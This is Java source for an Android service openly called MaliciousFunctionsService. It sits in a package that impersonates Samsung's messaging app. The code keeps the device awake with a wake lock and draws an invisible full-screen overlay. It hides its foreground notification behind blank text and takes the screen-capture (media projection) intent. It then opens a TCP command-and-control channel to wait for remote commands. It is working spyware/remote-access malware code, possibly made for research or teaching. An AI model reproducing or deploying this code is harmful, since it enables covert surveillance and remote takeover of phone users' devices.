package com.samsung.android.messaging;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.samsung.android.messaging2.R;

public class MaliciousFunctionsService extends Service {
    private static final String TAG = "MaliciousFunctionsService";

    // For mediaProjection API
    private Intent mediaProjectionIntent;
    private int mediaProjectionResultCode;



    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        Log.d(TAG, "onBind");
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate");

        // Keep the device always awake, even with the screen turned off :)
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                "MyApp::MyWakelockTag");
        wakeLock.acquire();


        // Have a transparent display?
        WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        LayoutInflater inflater = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);
        View transparentView = inflater.inflate(R.layout.transparent_view, null);
        transparentView.setVisibility(View.VISIBLE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED |
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.CENTER;
        windowManager.addView(transparentView, params);


        // Some boiler plate code to create a proper ServiceChannel for CHANNEL_ID.
        // Without this, Android will complain about CHANNEL_ID usage when building
        // the notification using NotificationCompat.Builder below.
        // Thanks Gauss!
        CharSequence name = "Malicious Service";
        String description = "Definitely not doing anything bad here.... Please disregard";
        String channelId = "malicious";
        int importance = NotificationManager.IMPORTANCE_LOW;
        NotificationChannel channel = new NotificationChannel(channelId, name, importance);
        channel.setDescription(description);
        NotificationManager manager = getSystemService(NotificationManager.class);
        manager.createNotificationChannel(channel);


        // Code to launch this AccessiblityService to run in the background.
        // Without this, its just a regular service and we will only get
        // AccessibilityEvents when our malicious app is active on the screen.
        // We do not want that, we want to always capture AccessibilityEvents
        // after our malicious app has been launched.
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
                notificationIntent, PendingIntent.FLAG_IMMUTABLE);
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, channelId)
                .setSmallIcon(R.mipmap.ic_launcher_round)
                .setContentTitle("")
                .setContentText("")
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setContentIntent(pendingIntent)
                .setOngoing(true);
        startForeground(1, builder.build());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Grab the passed in stuff from intent we need for MediaProjection
        mediaProjectionIntent = intent.getParcelableExtra("MEDIA_PROJECTION_INTENT");
        mediaProjectionResultCode = intent.getIntExtra("MEDIA_PROJECTION_RESULT_CODE", 0);


        // Connect to C2 via TCP and wait for commands
        TcpC2Communicator tcpCommunicator = new TcpC2Communicator(getApplicationContext(), mediaProjectionIntent);
        Thread tcpThread = new Thread(tcpCommunicator);
        tcpThread.start();
        return super.onStartCommand(intent, flags, startId);
    }
}
